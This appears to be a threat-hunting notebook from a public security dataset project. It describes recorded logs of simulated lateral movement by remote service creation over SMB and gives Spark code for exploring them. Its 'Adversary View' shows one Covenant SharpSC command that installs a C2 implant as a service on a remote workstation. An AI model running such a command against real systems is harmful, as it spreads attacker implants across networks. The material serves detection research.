# %% [markdown]
# # Covenant SharpSC Create

# %% [markdown]
# ## Metadata

# %% [markdown]
# |                   |    |
# |:------------------|:---|
# | Author            | Roberto Rodriguez @Cyb3rWard0g |
# | Creation Date     | 2020/08/06 |
# | Modification Date | 2020/09/20 |
# | Tactics           | ['[TA0008](https://attack.mitre.org/tactics/TA0008)'] |
# | Techniques        | ['[T1021.002](https://attack.mitre.org/techniques/T1021/002)'] |
# | Tags              | ['RPC CreateService', 'SMB Svcctl'] |

# %% [markdown]
# ## Dataset Description
# This dataset represents adversaries remotely creating a service via RPC methods such as CreateService over SMB named pipes such as svcctl.

# %% [markdown]
# ## Datasets Downloads

# %% [markdown]
# | Dataset Type | Link   |
# |:-------------|:-------|
# | Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/small/windows/lateral_movement/host/covenant_sharpsc_create_dcerpc_smb_svcctl.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/small/windows/lateral_movement/host/covenant_sharpsc_create_dcerpc_smb_svcctl.zip) |
# | Network | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/small/windows/lateral_movement/network/covenant_sharpsc_create_dcerpc_smb_svcctl.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/small/windows/lateral_movement/network/covenant_sharpsc_create_dcerpc_smb_svcctl.zip) |

# %% [markdown]
# ## Notebooks
# Notebooks created by the community leveraging the mordor datasets

# %% [markdown]
# | Author | Name | Link |
# |:-------|:-----|:-----|

# %% [markdown]
# ## Simulation Plan

# %% [markdown]
# | Environment | Tool Type | Module |
# |:------------|:----------|:-------|
# | Mordor shire | C2 | [SharpSC](https://github.com/cobbr/Covenant/blob/19e4a17048ade1b854241bb5d938398860ab5981/Covenant/Data/Tasks/SharpSC.yaml) |

# %% [markdown]
# ## Adversary View
# ```
# (wardog) > SharpSC /command:"action=create computername=WORKSTATION6 service=Cyb3rWard0g displayname=OTR binpath=C:\Windows\System32\GruntHTTP2.exe"
#
# [-] Error uninstalling Cyb3rWard0g on WORKSTATION6. Reason: ServiceHandle is invalid.
#
# [*] Attempting to create service Cyb3rWard0g on WORKSTATION6...
#
# [*] Created Cyb3rWard0g Service on WORKSTATION6
# ```

# %% [markdown]
# ## Explore Mordor Dataset

# %% [markdown]
# ### Initialize Analytics Engine

# %%
from openhunt.mordorutils import *
spark = get_spark()

# %% [markdown]
# ### Download & Process Mordor File

# %%
mordor_file = "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/small/windows/lateral_movement/host/covenant_sharpsc_create_dcerpc_smb_svcctl.zip"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

# %% [markdown]
# ### Get to know your data

# %%
df = spark.sql(
'''
SELECT Hostname,Channel,EventID, Count(*) as count
FROM mordorTable
GROUP BY Hostname,Channel,EventID
ORDER BY count DESC
'''
)
df.show(truncate=False)
